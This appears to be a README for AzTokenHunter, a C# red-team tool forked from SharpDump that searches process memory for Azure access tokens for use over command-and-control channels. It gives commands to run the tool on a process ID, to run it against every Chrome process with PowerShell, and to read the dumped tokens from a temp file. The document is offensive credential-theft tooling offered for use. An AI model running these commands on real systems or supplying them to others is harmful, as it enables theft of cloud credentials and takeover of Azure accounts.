# AzTokenHunter
Hunts for Azure tokens inside of process memory. Written in C# use usage in C2. A fork of SharpDump.

# Usage
```
AzTokenHunter.exe <PID>
```

# Dumping Tokens From Multiple Processes of the Same Name
```
Get-Process chrome | %{.\AzTokenHunter.exe $_.Id}
```

# Dumping Results
```
type C:\Windows\Temp\token.out
```
